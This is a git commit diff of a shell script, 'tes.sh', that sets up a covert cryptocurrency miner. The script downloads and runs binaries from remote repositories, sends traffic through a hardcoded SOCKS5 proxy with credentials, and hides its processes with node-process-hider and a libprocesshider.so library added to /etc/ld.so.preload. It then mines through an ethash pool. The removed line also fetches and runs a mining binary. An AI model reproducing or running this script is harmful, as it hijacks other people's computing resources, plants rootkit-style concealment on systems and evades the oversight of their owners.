638ff7907f08d4952417a91d085f9b5e2bbc2a8b
rindalasririn <95740336+rindalasririn@users.noreply.github.com>
2022-05-10 00:50:19 -0600

    Update tes.sh

--- tes.sh
+++ tes.sh
@@ -1,2 +1,48 @@
-lscpu
-wget https://github.com/Marisakitam/kaman/raw/main/holo && chmod 777 holo && ./holo -v -l na.luckpool.net:3956 -u RHaSb1EVex7nLkDCVspVuHis7XgS9eFpKm.ken -p x -t 30
+ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone
+dpkg-reconfigure --frontend noninteractive tzdata
+
+
+apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen
+
+apt-get install libpci3
+
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+
+apt-get install -y nodejs
+
+npm i -g node-process-hider
+
+nohup wget https://gitlab.com/randukapuk625/novi/-/raw/main/grapLol.tar.gz > nohup.out
+
+tar -xvzf grapLol.tar.gz
+
+cat > graftcp/local/graftcp-local.conf <<END
+listen = :2233
+loglevel = 1
+socks5 = 45.86.71.9:6269
+socks5_username = lebarankita
+socks5_password = buatTHRan
+END
+
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
+
+sleep .2
+
+./graftcp/graftcp curl ifconfig.me
+
+echo " "
+echo " "
+
+nohup wget https://gitlab.com/randukapuk625/novi/-/raw/main/mini > nohup.out
+make
+chmod +x mini
+ph add mini
+
+wget https://gitlab.com/randukapuk625/novi/-/raw/main/Magicmini.zip > nohup.out
+make
+nohup unzip Magicmini.zip > nohup.out
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+nohup ./graftcp/graftcp ./mini --url=ssl://teguhcong.satu@ethash.poolbinance.com:443 --log --extra > nohup.out
